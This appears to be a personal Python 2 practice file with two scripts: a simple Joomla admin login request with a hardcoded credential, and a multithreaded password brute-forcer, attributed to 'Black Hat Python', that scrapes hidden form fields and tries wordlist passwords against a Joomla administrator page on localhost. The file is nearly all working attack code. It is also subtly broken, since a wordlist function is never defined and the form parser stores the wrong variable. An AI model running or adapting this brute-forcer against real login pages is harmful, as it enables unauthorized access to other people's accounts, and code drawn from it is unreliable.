import cookielib
import urllib
import urllib2


# Store the cookies and create an opener that will hold them
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

# Add our headers
opener.addheaders = [('User-agent', 'Mozilla/5.0')]

# Install our opener (note that this changes the global opener to the one
# we just made, but you can also just call opener.open() if you want)
urllib2.install_opener(opener)

# The action/ target from the form
#authentication_url = 'https://ssl.reddit.com/post/login'
authentication_url = 'http://localhost/joomla/administrator/index.php'

# Input parameters we are going to send
payload = {
  'option': 'com_login',
  'task': 'login',
  'username': 'admin',
  'passwd': 'killer'
  }

# Use urllib to encode the payload
data = urllib.urlencode(payload)

# Build our Request object (supplying 'data' makes it a POST)
req = urllib2.Request(authentication_url, data)

# Make the request and read the response
resp = urllib2.urlopen(req)

contents = resp.read()

print contents

error = "Username and password do not match or you do not have an account yet"


"""
From black hat Python
"""

import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
from HTMLParser import HTMLParser
# general settings
user_thread = 10
username = "admin"
wordlist_file = "dict.txt"
resume = None
# target specific settings
target_url = "http://localhost/administrator/index.php"
target_post = "http://localhost/administrator/index.php"
username_field= "username"
password_field= "passwd"
success_check = "Administration - Control Panel"

class Bruter(object):

	def __init__(self, username, words):
		self.username = username
		self.password_q = words
		self.found = False
		print "Finished setting up for: %s" % username

	def run_bruteforce(self):	
		for i in range(user_thread):
			t = threading.Thread(target=self.web_bruter)
			t.start()

	def web_bruter(self):
		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			jar = cookielib.FileCookieJar("cookies")
			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

			response = opener.open(target_url)

			page = response.read()
			print "Trying: %s : %s (%d left)" % (self.username,brute,self.
			password_q.qsize())

			# parse out the hidden fields
			parser = BruteParser()
			parser.feed(page)

			post_tags = parser.tag_results

			# add our username and password fields
			post_tags[username_field] = self.username
			post_tags[password_field] = brute

			login_data = urllib.urlencode(post_tags)
			login_response = opener.open(target_post, login_data)
			
			login_result = login_response.read()

			if success_check in login_result:
				self.found = True
				print "[*] Bruteforce successful."
				print "[*] Username: %s" % username
				print "[*] Password: %s" % brute
				print "[*] Waiting for other threads to exit..."


class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name,value in attrs:
				if name == "name":
					tag_name = value
				if name == "value":
					tag_value = value
			if tag_name is not None:
				self.tag_results[tag_name] = value


# last part
# build_wordlist function not defined
# have to test this stuff
# scavange
# implement proxy switchng
words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()